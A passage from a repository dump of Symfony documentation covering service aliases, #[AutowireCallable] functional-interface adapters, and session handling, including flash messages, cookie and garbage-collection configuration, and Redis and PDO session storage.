};\n\nIn this case, *two* services are registered: ``site_update_manager.superadmin``\nand ``site_update_manager.normal_users``. Thanks to the alias, if you type-hint\n``SiteUpdateManager`` the first (``site_update_manager.superadmin``) will be passed.\n\nIf you want to pass the second, you'll need to :ref:`manually wire the service <services-wire-specific-service>`\nor to create a named :ref:`autowiring alias <autowiring-alias>`.\n\n.. warning::\n\n    If you do *not* create the alias and are :ref:`loading all services from src/ <service-container-services-load-example>`,\n    then *three* services have been created (the automatic service + your two services)\n    and the automatically loaded service will be passed - by default - when you type-hint\n    ``SiteUpdateManager``. That's why creating the alias is a good idea.\n\nWhen using PHP closures to configure your services, it is possible to automatically\ninject the current environment value by adding a string argument named ``$env`` to\nthe closure::\n\n    // config/packages/my_config.php\n    namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n    return function(ContainerConfigurator $containerConfigurator, string $env): void {\n        // `$env` is automatically filled in, so you can configure your\n        // services depending on which environment you're on\n    };\n\nGenerating Adapters for Functional Interfaces\n---------------------------------------------\n\nFunctional interfaces are interfaces with a single method.\nThey are conceptually very similar to a closure except that their only method\nhas a name. Moreover, they can be used as type-hints across your code.\n\nThe :class:`Symfony\\\\Component\\\\DependencyInjection\\\\Attribute\\\\AutowireCallable`\nattribute can be used to generate an adapter for a functional interface.\nLet's say you have the following functional interface::\n\n    // src/Service/MessageFormatterInterface.php\n    namespace App\\Service;\n\n    interface MessageFormatterInterface\n    {\n        public function format(string $message, array $parameters): string;\n    }\n\nYou also have a service that defines many methods and one of them is the same\n``format()`` method of the previous interface::\n\n    // src/Service/MessageUtils.php\n    namespace App\\Service;\n\n    class MessageUtils\n    {\n        // other methods...\n\n        public function format(string $message, array $parameters): string\n        {\n            // ...\n        }\n    }\n\nThanks to the ``#[AutowireCallable]`` attribute, you can now inject this\n``MessageUtils`` service as a functional interface implementation::\n\n    namespace App\\Service\\Mail;\n\n    use App\\Service\\MessageFormatterInterface;\n    use App\\Service\\MessageUtils;\n    use Symfony\\Component\\DependencyInjection\\Attribute\\AutowireCallable;\n\n    class Mailer\n    {\n        public function __construct(\n            #[AutowireCallable(service: MessageUtils::class, method: 'format')]\n            private MessageFormatterInterface $formatter\n        ) {\n        }\n\n        public function sendMail(string $message, array $parameters): string\n        {\n            $formattedMessage = $this->formatter->format($message, $parameters);\n\n            // ...\n        }\n    }\n\nInstead of using the ``#[AutowireCallable]`` attribute, you can also generate\nan adapter for a functional interface through configuration:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n\n            # ...\n\n            app.message_formatter:\n                class: App\\Service\\MessageFormatterInterface\n                from_callable: [!service {class: 'App\\Service\\MessageUtils'}, 'format']\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <!-- ... -->\n\n                <service id=\"app.message_formatter\" class=\"App\\Service\\MessageFormatterInterface\">\n                    <from-callable method=\"format\">\n                        <service class=\"App\\Service\\MessageUtils\"/>\n                    </from-callable>\n                </service>\n\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use App\\Service\\MessageFormatterInterface;\n        use App\\Service\\MessageUtils;\n\n        return function(ContainerConfigurator $container) {\n            // ...\n\n            $container\n                ->set('app.message_formatter', MessageFormatterInterface::class)\n                ->fromCallable([inline_service(MessageUtils::class), 'format'])\n                ->alias(MessageFormatterInterface::class, 'app.message_formatter')\n            ;\n        };\n\nBy doing so, Symfony will generate a class (also called an *adapter*)\nimplementing ``MessageFormatterInterface`` that will forward calls of\n``MessageFormatterInterface::format()`` to your underlying service's method\n``MessageUtils::format()``, with all its arguments.\n\nLearn more\n----------\n\n.. toctree::\n    :maxdepth: 1\n    :glob:\n\n    /service_container/*\n\n.. _`glob pattern`: https://en.wikipedia.org/wiki/Glob_(programming)\n.. _`Symfony Fundamentals screencast series`: https://symfonycasts.com/screencast/symfony-fundamentals\n"
        },
        {
          "name": "service_container",
          "type": "tree",
          "content": null
        },
        {
          "name": "session.rst",
          "type": "blob",
          "size": 69.3251953125,
          "content": "Sessions\n========\n\nThe Symfony HttpFoundation component has a very powerful and flexible session\nsubsystem which is designed to provide session management that you can use to\nstore information about the user between requests through a clear\nobject-oriented interface using a variety of session storage drivers.\n\nSymfony sessions are designed to replace the usage of the ``$_SESSION`` super\nglobal and native PHP functions related to manipulating the session like\n``session_start()``, ``session_regenerate_id()``, ``session_id()``,\n``session_name()``, and ``session_destroy()``.\n\n.. note::\n\n    Sessions are only started if you read or write from it.\n\nInstallation\n------------\n\nYou need to install the HttpFoundation component to handle sessions:\n\n.. code-block:: terminal\n\n    $ composer require symfony/http-foundation\n\n.. _session-intro:\n\nBasic Usage\n-----------\n\nThe session is available through the ``Request`` object and the ``RequestStack``\nservice. Symfony injects the ``request_stack`` service in services and controllers\nif you type-hint an argument with :class:`Symfony\\\\Component\\\\HttpFoundation\\\\RequestStack`::\n\n.. configuration-block::\n\n    .. code-block:: php-symfony\n\n        use Symfony\\Component\\HttpFoundation\\RequestStack;\n\n        class SomeService\n        {\n            public function __construct(\n                private RequestStack $requestStack,\n            ) {\n                // Accessing the session in the constructor is *NOT* recommended, since\n                // it might not be accessible yet or lead to unwanted side-effects\n                // $this->session = $requestStack->getSession();\n            }\n\n            public function someMethod(): void\n            {\n                $session = $this->requestStack->getSession();\n\n                // ...\n            }\n        }\n\n    .. code-block:: php-standalone\n\n        use Symfony\\Component\\HttpFoundation\\Session\\Session;\n\n        $session = new Session();\n        $session->start();\n\nFrom a Symfony controller, you can also type-hint an argument with\n:class:`Symfony\\\\Component\\\\HttpFoundation\\\\Request`::\n\n    use Symfony\\Component\\HttpFoundation\\Request;\n    use Symfony\\Component\\HttpFoundation\\Response;\n\n    public function index(Request $request): Response\n    {\n        $session = $request->getSession();\n\n        // ...\n    }\n\nSession Attributes\n------------------\n\nPHP's session management requires the use of the ``$_SESSION`` super-global.\nHowever, this interferes with code testability and encapsulation in an OOP\nparadigm. To help overcome this, Symfony uses *session bags* linked to the\nsession to encapsulate a specific dataset of **attributes**.\n\nThis approach mitigates namespace pollution within the ``$_SESSION``\nsuper-global because each bag stores all its data under a unique namespace.\nThis allows Symfony to peacefully co-exist with other applications or libraries\nthat might use the ``$_SESSION`` super-global and all data remains completely\ncompatible with Symfony's session management.\n\nA session bag is a PHP object that acts like an array::\n\n    // stores an attribute for reuse during a later user request\n    $session->set('attribute-name', 'attribute-value');\n\n    // gets an attribute by name\n    $foo = $session->get('foo');\n\n    // the second argument is the value returned when the attribute doesn't exist\n    $filters = $session->get('filters', []);\n\nStored attributes remain in the session for the remainder of that user's session.\nBy default, session attributes are key-value pairs managed with the\n:class:`Symfony\\\\Component\\\\HttpFoundation\\\\Session\\\\Attribute\\\\AttributeBag`\nclass.\n\nSessions are automatically started whenever you read, write or even check for\nthe existence of data in the session. This may hurt your application performance\nbecause all users will receive a session cookie. In order to prevent starting\nsessions for anonymous users, you must *completely* avoid accessing the session.\n\n.. note::\n\n    Sessions will also be started when using features that rely on them internally,\n    such as the :ref:`CSRF protection in forms <csrf-protection-forms>`.\n\n.. _flash-messages:\n\nFlash Messages\n--------------\n\nYou can store special messages, called \"flash\" messages, on the user's session.\nBy design, flash messages are meant to be used exactly once: they vanish from\nthe session automatically as soon as you retrieve them. This feature makes\n\"flash\" messages particularly great for storing user notifications.\n\nFor example, imagine you're processing a :doc:`form </forms>` submission::\n\n.. configuration-block::\n\n    .. code-block:: php-symfony\n\n        use Symfony\\Component\\HttpFoundation\\Request;\n        use Symfony\\Component\\HttpFoundation\\Response;\n        // ...\n\n        public function update(Request $request): Response\n        {\n            // ...\n\n            if ($form->isSubmitted() && $form->isValid()) {\n                // do some sort of processing\n\n                $this->addFlash(\n                    'notice',\n                    'Your changes were saved!'\n                );\n                // $this->addFlash() is equivalent to $request->getSession()->getFlashBag()->add()\n\n                return $this->redirectToRoute(/* ... */);\n            }\n\n            return $this->render(/* ... */);\n        }\n\n    .. code-block:: php-standalone\n\n        use Symfony\\Component\\HttpFoundation\\Session\\Session;\n\n        $session = new Session();\n        $session->start();\n\n        // retrieve the flash messages bag\n        $flashes = $session->getFlashBag();\n\n        // add flash messages\n        $flashes->add(\n            'notice',\n            'Your changes were saved'\n        );\n\nAfter processing the request, the controller sets a flash message in the\nsession and then redirects. The message key (``notice`` in this example)\ncan be anything. You'll use this key to retrieve the message.\n\nIn the template of the next page (or even better, in your base layout template),\nread any flash messages from the session using the ``flashes()`` method provided\nby the :ref:`Twig global app variable <twig-app-variable>`.\nAlternatively, you can use the\n:method:`Symfony\\\\Component\\\\HttpFoundation\\\\Session\\\\Flash\\\\FlashBagInterface::peek`\nmethod to retrieve the message while keeping it in the bag:\n\n.. configuration-block::\n\n    .. code-block:: html+twig\n\n        {# templates/base.html.twig #}\n\n        {# read and display just one flash message type #}\n        {% for message in app.flashes('notice') %}\n            <div class=\"flash-notice\">\n                {{ message }}\n            </div>\n        {% endfor %}\n\n        {# same but without clearing them from the flash bag #}\n        {% for message in app.session.flashbag.peek('notice') %}\n            <div class=\"flash-notice\">\n                {{ message }}\n            </div>\n        {% endfor %}\n\n        {# read and display several types of flash messages #}\n        {% for label, messages in app.flashes(['success', 'warning']) %}\n            {% for message in messages %}\n                <div class=\"flash-{{ label }}\">\n                    {{ message }}\n                </div>\n            {% endfor %}\n        {% endfor %}\n\n        {# read and display all flash messages #}\n        {% for label, messages in app.flashes %}\n            {% for message in messages %}\n                <div class=\"flash-{{ label }}\">\n                    {{ message }}\n                </div>\n            {% endfor %}\n        {% endfor %}\n\n        {# or without clearing the flash bag #}\n        {% for label, messages in app.session.flashbag.peekAll() %}\n            {% for message in messages %}\n                <div class=\"flash-{{ label }}\">\n                    {{ message }}\n                </div>\n            {% endfor %}\n        {% endfor %}\n\n    .. code-block:: php-standalone\n\n        // display warnings\n        foreach ($session->getFlashBag()->get('warning', []) as $message) {\n            echo '<div class=\"flash-warning\">'.$message.'</div>';\n        }\n\n        // display warnings without clearing them from the flash bag\n        foreach ($session->getFlashBag()->peek('warning', []) as $message) {\n            echo '<div class=\"flash-warning\">'.$message.'</div>';\n       }\n\n        // display errors\n        foreach ($session->getFlashBag()->get('error', []) as $message) {\n            echo '<div class=\"flash-error\">'.$message.'</div>';\n        }\n\n        // display all flashes at once\n        foreach ($session->getFlashBag()->all() as $type => $messages) {\n            foreach ($messages as $message) {\n                echo '<div class=\"flash-'.$type.'\">'.$message.'</div>';\n            }\n        }\n\n        // display all flashes at once without clearing the flash bag\n        foreach ($session->getFlashBag()->peekAll() as $type => $messages) {\n            foreach ($messages as $message) {\n                echo '<div class=\"flash-'.$type.'\">'.$message.'</div>';\n            }\n        }\n\nIt's common to use ``notice``, ``warning`` and ``error`` as the keys of the\ndifferent types of flash messages, but you can use any key that fits your\nneeds.\n\nConfiguration\n-------------\n\nIn the Symfony framework, sessions are enabled by default. Session storage and\nother configuration can be controlled under the :ref:`framework.session\nconfiguration <config-framework-session>` in\n``config/packages/framework.yaml``:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        framework:\n            # Enables session support. Note that the session will ONLY be started if you read or write from it.\n            # Remove or comment this section to explicitly disable session support.\n            session:\n                # ID of the service used for session storage\n                # NULL means that Symfony uses PHP default session mechanism\n                handler_id: null\n                # improves the security of the cookies used for sessions\n                cookie_secure: auto\n                cookie_samesite: lax\n                storage_factory_id: session.storage.factory.native\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <!--\n                    Enables session support. Note that the session will ONLY be started if you read or write from it.\n                    Remove or comment this section to explicitly disable session support.\n                    handler-id: ID of the service used for session storage\n                                NULL means that Symfony uses PHP default session mechanism\n                    cookie-secure and cookie-samesite: improves the security of the cookies used for sessions\n                -->\n                <framework:session handler-id=\"null\"\n                                   cookie-secure=\"auto\"\n                                   cookie-samesite=\"lax\"\n                                   storage_factory_id=\"session.storage.factory.native\"/>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Component\\HttpFoundation\\Cookie;\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->session()\n                // Enables session support. Note that the session will ONLY be started if you read or write from it.\n                // Remove or comment this section to explicitly disable session support.\n                ->enabled(true)\n                // ID of the service used for session storage\n                // NULL means that Symfony uses PHP default session mechanism\n                ->handlerId(null)\n                // improves the security of the cookies used for sessions\n                ->cookieSecure('auto')\n                ->cookieSamesite(Cookie::SAMESITE_LAX)\n                ->storageFactoryId('session.storage.factory.native')\n            ;\n        };\n\n    .. code-block:: php-standalone\n\n        use Symfony\\Component\\HttpFoundation\\Cookie;\n        use Symfony\\Component\\HttpFoundation\\Session\\Attribute\\AttributeBag;\n        use Symfony\\Component\\HttpFoundation\\Session\\Session;\n        use Symfony\\Component\\HttpFoundation\\Session\\Storage\\NativeSessionStorage;\n\n        $storage = new NativeSessionStorage([\n            'cookie_secure' => 'auto',\n            'cookie_samesite' => Cookie::SAMESITE_LAX,\n        ]);\n        $session = new Session($storage);\n\nSetting the ``handler_id`` config option to ``null`` means that Symfony will\nuse the native PHP session mechanism. The session metadata files will be stored\noutside of the Symfony application, in a directory controlled by PHP. Although\nthis usually simplifies things, some session expiration related options may not\nwork as expected if other applications that write to the same directory have\nshort max lifetime settings.\n\nIf you prefer, you can use the ``session.handler.native_file`` service as\n``handler_id`` to let Symfony manage the sessions itself. Another useful option\nis ``save_path``, which defines the directory where Symfony will store the\nsession metadata files:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        framework:\n            session:\n                # ...\n                handler_id: 'session.handler.native_file'\n                save_path: '%kernel.project_dir%/var/sessions/%kernel.environment%'\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:session enabled=\"true\"\n                                   handler-id=\"session.handler.native_file\"\n                                   save-path=\"%kernel.project_dir%/var/sessions/%kernel.environment%\"/>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->session()\n                // ...\n                ->handlerId('session.handler.native_file')\n                ->savePath('%kernel.project_dir%/var/sessions/%kernel.environment%')\n            ;\n        };\n\n    .. code-block:: php-standalone\n\n        use Symfony\\Component\\HttpFoundation\\Cookie;\n        use Symfony\\Component\\HttpFoundation\\Session\\Attribute\\AttributeBag;\n        use Symfony\\Component\\HttpFoundation\\Session\\Session;\n        use Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\NativeFileSessionHandler;\n        use Symfony\\Component\\HttpFoundation\\Session\\Storage\\NativeSessionStorage;\n\n        $handler = new NativeFileSessionHandler('/var/sessions');\n        $storage = new NativeSessionStorage([], $handler);\n        $session = new Session($storage);\n\nCheck out the Symfony config reference to learn more about the other available\n:ref:`Session configuration options <config-framework-session>`.\n\n.. warning::\n\n    Symfony sessions are incompatible with ``php.ini`` directive\n    ``session.auto_start = 1`` This directive should be turned off in\n    ``php.ini``, in the web server directives or in ``.htaccess``.\n\nThe session cookie is also available in :ref:`the Response object <component-http-foundation-response>`.\nThis is useful to get that cookie in the CLI context or when using PHP runners\nlike Roadrunner or Swoole.\n\nSession Idle Time/Keep Alive\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThere are often circumstances where you may want to protect, or minimize\nunauthorized use of a session when a user steps away from their terminal while\nlogged in by destroying the session after a certain period of idle time. For\nexample, it is common for banking applications to log the user out after just\n5 to 10 minutes of inactivity. Setting the cookie lifetime here is not\nappropriate because that can be manipulated by the client, so we must do the expiry\non the server side. The easiest way is to implement this via :ref:`session garbage collection <session-garbage-collection>`\nwhich runs reasonably frequently. The ``cookie_lifetime`` would be set to a\nrelatively high value, and the garbage collection ``gc_maxlifetime`` would be set\nto destroy sessions at whatever the desired idle period is.\n\nThe other option is specifically check if a session has expired after the\nsession is started. The session can be destroyed as required. This method of\nprocessing can allow the expiry of sessions to be integrated into the user\nexperience, for example, by displaying a message.\n\nSymfony records some metadata about each session to give you fine control over\nthe security settings::\n\n    $session->getMetadataBag()->getCreated();\n    $session->getMetadataBag()->getLastUsed();\n\nBoth methods return a Unix timestamp (relative to the server).\n\nThis metadata can be used to explicitly expire a session on access::\n\n    $session->start();\n    if (time() - $session->getMetadataBag()->getLastUsed() > $maxIdleTime) {\n        $session->invalidate();\n        throw new SessionExpired(); // redirect to expired session page\n    }\n\nIt is also possible to tell what the ``cookie_lifetime`` was set to for a\nparticular cookie by reading the ``getLifetime()`` method::\n\n    $session->getMetadataBag()->getLifetime();\n\nThe expiry time of the cookie can be determined by adding the created\ntimestamp and the lifetime.\n\n.. _session-garbage-collection:\n\nConfiguring Garbage Collection\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nWhen a session opens, PHP will call the ``gc`` handler randomly according to the\nprobability set by ``session.gc_probability`` / ``session.gc_divisor``. For\nexample if these were set to ``5/100`` respectively, it would mean a probability\nof 5%. Similarly, ``3/4`` would mean a 3 in 4 chance of being called, i.e. 75%.\n\nIf the garbage collection handler is invoked, PHP will pass the value stored in\nthe ``php.ini`` directive ``session.gc_maxlifetime``. The meaning in this context is\nthat any stored session that was saved more than ``gc_maxlifetime`` ago should be\ndeleted. This allows one to expire records based on idle time.\n\nHowever, some operating systems (e.g. Debian) do their own session handling and set\nthe ``session.gc_probability`` variable to ``0`` to stop PHP doing garbage\ncollection. That's why Symfony now overwrites this value to ``1``.\n\nIf you wish to use the original value set in your ``php.ini``, add the following\nconfiguration:\n\n.. code-block:: yaml\n\n    # config/packages/framework.yaml\n    framework:\n        session:\n            # ...\n            gc_probability: null\n\nYou can configure these settings by passing ``gc_probability``, ``gc_divisor``\nand ``gc_maxlifetime`` in an array to the constructor of\n:class:`Symfony\\\\Component\\\\HttpFoundation\\\\Session\\\\Storage\\\\NativeSessionStorage`\nor to the :method:`Symfony\\\\Component\\\\HttpFoundation\\\\Session\\\\Storage\\\\NativeSessionStorage::setOptions`\nmethod.\n\n.. _session-database:\n\nStore Sessions in a Database\n----------------------------\n\nSymfony stores sessions in files by default. If your application is served by\nmultiple servers, you'll need to use a database instead to make sessions work\nacross different servers.\n\nSymfony can store sessions in all kinds of databases (relational, NoSQL and\nkey-value) but recommends key-value databases like Redis to get best\nperformance.\n\nStore Sessions in a key-value Database (Redis)\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThis section assumes that you have a fully-working Redis server and have also\ninstalled and configured the `phpredis extension`_.\n\nYou have two different options to use Redis to store sessions:\n\nThe first PHP-based option is to configure Redis session handler directly\nin the server ``php.ini`` file:\n\n.. code-block:: ini\n\n    ; php.ini\n    session.save_handler = redis\n    session.save_path = \"tcp://192.168.0.178:6379?auth=REDIS_PASSWORD\"\n\nThe second option is to configure Redis sessions in Symfony. First, define\na Symfony service for the connection to the Redis server:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            # ...\n            Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\RedisSessionHandler:\n                arguments:\n                    - '@Redis'\n                    # you can optionally pass an array of options. The only options are 'prefix' and 'ttl',\n                    # which define the prefix to use for the keys to avoid collision on the Redis server\n                    # and the expiration time for any given entry (in seconds), defaults are 'sf_s' and null:\n                    # - { 'prefix': 'my_prefix', 'ttl': 600 }\n\n            Redis:\n                # you can also use \\RedisArray, \\RedisCluster, \\Relay\\Relay or \\Predis\\Client classes\n                class: \\Redis\n                calls:\n                    - connect:\n                        - '%env(REDIS_HOST)%'\n                        - '%env(int:REDIS_PORT)%'\n\n                    # uncomment the following if your Redis server requires a password\n                    # - auth:\n                    #     - '%env(REDIS_PASSWORD)%'\n\n                    # uncomment the following if your Redis server requires a user and a password (when user is not default)\n                    # - auth:\n                    #     - ['%env(REDIS_USER)%','%env(REDIS_PASSWORD)%']\n\n    .. code-block:: xml\n\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <!-- you can also use \\RedisArray, \\RedisCluster, \\Relay\\Relay or \\Predis\\Client classes -->\n                <service id=\"Redis\" class=\"Redis\">\n                    <call method=\"connect\">\n                        <argument>%env(REDIS_HOST)%</argument>\n                        <argument>%env(int:REDIS_PORT)%</argument>\n                    </call>\n\n                    <!-- uncomment the following if your Redis server requires a password:\n                    <call method=\"auth\">\n                        <argument>%env(REDIS_PASSWORD)%</argument>\n                    </call> -->\n\n                    <!-- uncomment the following if your Redis server requires a user and a password (when user is not default):\n                    <call method=\"auth\">\n                        <argument>%env(REDIS_USER)%</argument>\n                        <argument>%env(REDIS_PASSWORD)%</argument>\n                    </call> -->\n                </service>\n\n                <service id=\"Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\RedisSessionHandler\">\n                    <argument type=\"service\" id=\"Redis\"/>\n                    <!-- you can optionally pass an array of options. The only options are 'prefix' and 'ttl',\n                         which define the prefix to use for the keys to avoid collision on the Redis server\n                         and the expiration time for any given entry (in seconds), defaults are 'sf_s' and null:\n                    <argument type=\"collection\">\n                        <argument key=\"prefix\">my_prefix</argument>\n                        <argument key=\"ttl\">600</argument>\n                    </argument> -->\n                </service>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        use Symfony\\Component\\DependencyInjection\\Reference;\n        use Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\RedisSessionHandler;\n\n        $container\n            // you can also use \\RedisArray, \\RedisCluster, \\Relay\\Relay or \\Predis\\Client classes\n            ->register('Redis', \\Redis::class)\n            ->addMethodCall('connect', ['%env(REDIS_HOST)%', '%env(int:REDIS_PORT)%'])\n            // uncomment the following if your Redis server requires a password:\n            // ->addMethodCall('auth', ['%env(REDIS_PASSWORD)%'])\n            // uncomment the following if your Redis server requires a user and a password (when user is not default):\n            // ->addMethodCall('auth', ['%env(REDIS_USER)%', '%env(REDIS_PASSWORD)%'])\n\n            ->register(RedisSessionHandler::class)\n            ->addArgument(\n                new Reference('Redis'),\n                // you can optionally pass an array of options. The only options are 'prefix' and 'ttl',\n                // which define the prefix to use for the keys to avoid collision on the Redis server\n                // and the expiration time for any given entry (in seconds), defaults are 'sf_s' and null:\n                // ['prefix' => 'my_prefix', 'ttl' => 600],\n            )\n        ;\n\nNext, use the :ref:`handler_id <config-framework-session-handler-id>`\nconfiguration option to tell Symfony to use this service as the session handler:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        framework:\n            # ...\n            session:\n                handler_id: Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\RedisSessionHandler\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <!-- ... -->\n                <framework:session handler-id=\"Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\RedisSessionHandler\"/>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\RedisSessionHandler;\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            // ...\n            $framework->session()\n                ->handlerId(RedisSessionHandler::class)\n            ;\n        };\n\nSymfony will now use your Redis server to read and write the session data. The\nmain drawback of this solution is that Redis does not perform session locking,\nso you can face *race conditions* when accessing sessions. For example, you may\nsee an *\"Invalid CSRF token\"* error because two requests were made in parallel\nand only the first one stored the CSRF token in the session.\n\n.. seealso::\n\n    If you use Memcached instead of Redis, follow a similar approach but\n    replace ``RedisSessionHandler`` by\n    :class:`Symfony\\\\Component\\\\HttpFoundation\\\\Session\\\\Storage\\\\Handler\\\\MemcachedSessionHandler`.\n\n.. tip::\n\n    When using Redis with a DSN in the\n    :ref:`handler_id <config-framework-session-handler-id>` config option, you can\n    add the ``prefix`` and ``ttl`` options as query string parameters in the DSN.\n\n.. _session-database-pdo:\n\nStore Sessions in a Relational Database (MariaDB, MySQL, PostgreSQL)\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nSymfony includes a\n:class:`Symfony\\\\Component\\\\HttpFoundation\\\\Session\\\\Storage\\\\Handler\\\\PdoSessionHandler`\nto store sessions in relational databases like MariaDB, MySQL and PostgreSQL.\nTo use it, first register a new handler service with your database credentials:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            # ...\n\n            Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\PdoSessionHandler:\n                arguments:\n                    - '%env(DATABASE_URL)%'\n\n                    # you can also use PDO configuration, but requires passing two arguments\n                    # - 'mysql:dbname=mydatabase; host=myhost; port=myport'\n                    # - { db_username: myuser, db_password: mypassword }\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <services>\n                <service id=\"Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\PdoSessionHandler\">\n                    <argument>%env(DATABASE_URL)%</argument>\n\n                    <!-- you can also use PDO configuration, but requires passing two arguments: -->\n                    <!-- <argument>mysql:dbname=mydatabase; host=myhost; port=myport</argument>\n                        <argument type=\"collection\">\n                            <argument key=\"db_username\">myuser</argument>\n                            <argument key=\"db_password\">mypassword</argument>\n                        </argument> -->\n                </service>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\PdoSessionHandler;\n\n        return static function (ContainerConfigurator $container): void {\n            $services = $container->services();\n\n            $services->set(PdoSessionHandler::class)\n                ->args([\n                    env('DATABASE_URL'),\n                    // you can also use PDO configuration, but requires passing two arguments:\n                    // 'mysql:dbname=mydatabase; host=myhost; port=myport',\n                    // ['db_username' => 'myuser', 'db_password' => 'mypassword'],\n                ])\n            ;\n        };\n\n.. tip::\n\n    When using MySQL as the database, the DSN defined in ``DATABASE_URL`` can\n    contain the ``charset`` and ``unix_socket`` options as query string parameters.\n\nNext, use the :ref:`handler_id <config-framework-session-handler-id>`\nconfiguration option to tell Symfony to use this service as the session handler:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        framework:\n            session:\n                # ...\n                handler_id: Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\PdoSessionHandler\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <!-- ... -->\n                <framework:session\n                    handler-id=\"Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\PdoSessionHandler\"/>\n            